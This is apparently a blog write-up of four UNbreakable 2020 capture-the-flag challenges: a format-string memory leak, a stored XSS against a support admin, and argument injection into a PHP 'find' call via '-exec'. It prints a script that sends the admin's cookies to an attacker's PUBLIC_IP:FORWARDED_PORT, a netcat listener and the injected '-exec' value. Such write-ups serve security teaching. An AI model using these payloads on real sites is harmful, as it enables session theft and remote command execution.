---
layout: post
title: "Breaking the UNbreakable 2020"
date: 2020-11-09 10:00:00 +0300
description: CTF writeup
tag: [CTF, Writeup, UNbreakable]
img: UNbreakable2020/title.png
---

On its first edition, UNbreakable is a promising CTF competition for high school and college students. It is hosted on the educational platform [cyberedu.ro](https://cyberedu.ro/) and backed by Bit Sentinel, whose CEO also founded [DefCamp](https://def.camp/).  
Although aimed at students, the challanges are not that easy, so it is a good exercise for anyone to try solve them. In a nutshell I'd say they are supposed to be solved with little technical knowledge, rather more ingenuity and documentation research. Some of them I was able to solve during the contest, some after and some are still a mystery, as for now there are no other writeups online. Participation is open for anyone, but only students may receive prizes.  
Now the challanges!

## better-cat

We are provided with an elf binary that asks for a password.  
Running a simple `strings cat.elf` on the file is enough to find the "password" for the flag or we could just simply build the flag from the output.

## notafuzz

So we're provided with the binary of a web service we can interact with over TCP. The attached file may not be so obvious at fist.  
![service interaction]({{site.baseurl}}/assets/img/posts/UNbreakable2020/naf-test.png)
So the program seems mostly to repeat what we say. If you are eager you can observe that a newline was omitted at some point. Anyway we better try to decompile the binary to see what happens in there. I preffer using Ghidra for this.
![decompiled code]({{site.baseurl}}/assets/img/posts/UNbreakable2020/naf-decompiled.png)
Studying the main function we see that all this program does it to repeat what we're saying. But there is a special case the third time we enter our input, the only thing different is that our input is printed with printf instead of puts.  
Doing some research you may find out that this allows for a format string attack. That means that we can use format strings (like `%s`) to read from memory starting from the address of the specified buffer (ie our input). After the declaration of the input buffer a few other variables are declared so we better see what they hold inside. The input buffer may hold a maximum of 1008 characters, so we may craft a payload that will try to read bytes from the stack in hexadecimal format in python `python -c "print(\"%08X\"*250)"`. This payload will work only the third time we enter input.
![sending the payload]({{site.baseurl}}/assets/img/posts/UNbreakable2020/naf-payload.png)
Ok, now we should translate the response from server. You can paste the input into a hex editor (I recommend Bless) or use xxd `echo "response" | xxd -r -u -p`.
![translated payload]({{site.baseurl}}/assets/img/posts/UNbreakable2020/naf-response.png)
Great! It seems the flag is in the output, just not in a very convienent form. The catch here is that X format printed sizeof(int) bytes in a little-endian representation. I used this format as it would print more memory than reading one byte at a time. You might rewrite it to its original form yourself or write a simple script to do it for you:
```python
message = "{ftcflagXXX}"
reordered = [''.join(reversed(message[index: index + 4])) for index in range(0, len(message), 4)]
reordered = ''.join(reordered)[:-3]
print (reordered)
```

## manual-review

We are presented a web platform where we can contact an admin, see the tickets in a chat-like manner and modify our account details. Usually this kind of challanges are supposed to make you annoy the admin with some dirty XSS and maybe try to steal his cookies.
![challenge overview]({{site.baseurl}}/assets/img/posts/UNbreakable2020/mr-overview.jpg)
Seems like there is no XSS filtering, so we have just to exploit this XSS vulnerability in the support system. Unfortunately the session cookie is http-only, so it can't be stolen, but anyway, for the sake of fun let's try to steal sum cookiez. It seems there is no obvious way to get feedback from admin on the platform, so let's use javascript to exfiltrate his cookies to our server.  
For this you must have [port forwarding](https://www.lifewire.com/how-to-port-forward-4163829) set up. Mostly you have to assign a static IP to your PC and set up port forwarding in your router config (under NAT settings) to forward traffic received on a specified public port of your choice to one on your machine. Then we can listen on that port with netcat `ncat -nlvp YOUR_PUBLIC_PORT`. Alternatively you can use Burp collaborator, but that is not included in the community version. Now it's quite easy to forge a payload for the admin to send us his cookies:  
```javascript
<script>
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "PUBLIC_IP:FORWARDED_PORT/?cookie=" + btoa(document.cookie));
xhttp.send();
</script>
```
Encoding to base64 will make sure that this will be a valid url.  
Looking at the request received from admin we can see the cookies are irrelevant and the flag was in its user agent. Who would have guessed it was there?
![admin response]({{site.baseurl}}/assets/img/posts/UNbreakable2020/mr-response.jpg)

## the-code
We're given the php code of a webpage and we have to find somehow the flag.
![challange overview]({{site.baseurl}}/assets/img/posts/UNbreakable2020/tc-overview.png)
Setting the start parameter in the URL will make the page active and we can inject our payload in args parameter, which would represent the name of the file we're searching in `/tmp`.
Some nasty shell metacharacters are blocked and escapeshellcmd is used to escape our input. Also the response from server is encoded in a hard to reverse way.  
Escapeshellcmd is supposed to escape any characters in a string that might be used to trick a shell command into executing arbitrary commands. On its php manual page we see a warning: **escapeshellcmd() should be used on the whole command string, and it still allows the attacker to pass arbitrary number of arguments. For escaping a single argument escapeshellarg() should be used instead.** Now we have a direction, we should use some parameter of find to do some bad stuff.  
`find --help` reveals an option -exec that allows the execution of arbitrary commands. That means we have a semi-blind RCE. One thing to note is that -exec runs the specified command only if it has found at least one file (it may run just once or once for each file found, depending on syntax). In order to get some results with `find /tmp -iname OUR_INPUT` we can specify the wildcard `*` which for this server will match all files inside the folder, including the folder itself.  
So far visiting `/?start=1&arg=*` will yield some encoded result ("L3RTCAOVDG1WL3N0YXJ0LNNOCG==") and we know we can run arbitrary semi-blind commands on the server. Ironic enough all I can think of is to use this find based RCE to maybe find a flag file on the server. After a long fuzzing time I found that `/?start=&arg=* -exec find / -iname flag ;` found something. Now the road splits in half, you may try to decode this by hand trying to guess which letter is uppercase and which not or you might try to figure out a way to exfiltrate data out-of-band to your server, if the firewall allows you to do that. I preffered to do it by hand during the contest and I found that the file was located under the root of the server.  
So basically anyone who'd try to access `/flag` randomly would get the flag.
